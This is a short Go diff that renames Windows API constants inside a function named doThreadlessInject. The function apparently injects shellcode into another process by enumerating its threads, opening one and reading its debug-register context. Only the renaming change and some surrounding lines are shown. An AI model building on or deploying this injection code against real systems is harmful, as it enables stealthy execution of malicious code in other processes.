@@ -19,7 +19,7 @@ func doThreadlessInject(hProc uintptr, pid uint32, sc []byte) error {
 	}
 
 	// Snapshot threads to find one in the target process
-	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
+	snap, _, _ := procCreateToolhelp32Snapshot.Call(th32csSnapThread, 0)
 	if snap == 0 {
 		return fmt.Errorf("CreateToolhelp32Snapshot failed")
 	}
@@ -31,7 +31,7 @@ func doThreadlessInject(hProc uintptr, pid uint32, sc []byte) error {
 	for ret != 0 {
 		if te.th32OwnerProcessID == pid {
 			hThread, _, _ := procOpenThread.Call(
-				THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT,
+				threadSuspendResume|threadGetContext|threadSetContext,
 				0, uintptr(te.th32ThreadID))
 			if hThread == 0 {
 				ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
@@ -48,7 +48,7 @@ func doThreadlessInject(hProc uintptr, pid uint32, sc []byte) error {
 
 			// Get thread context
 			var ctx threadContext
-			ctx.contextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS
+			ctx.contextFlags = contextFull | contextDebugRegisters
 			ret2, _, _ := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
 			if ret2 == 0 {
 				procResumeThread.Call(hThread)
@@ -128,8 +128,8 @@ type threadContext struct {
 }
 
 const (
-	CONTEXT_FULL            = 0x10007
-	CONTEXT_DEBUG_REGISTERS = 0x00010
-	THREAD_GET_CONTEXT      = 0x0008
-	THREAD_SET_CONTEXT      = 0x0010
+	contextFull           = 0x10007
+	contextDebugRegisters = 0x00010
+	threadGetContext      = 0x0008
+	threadSetContext      = 0x0010
 )
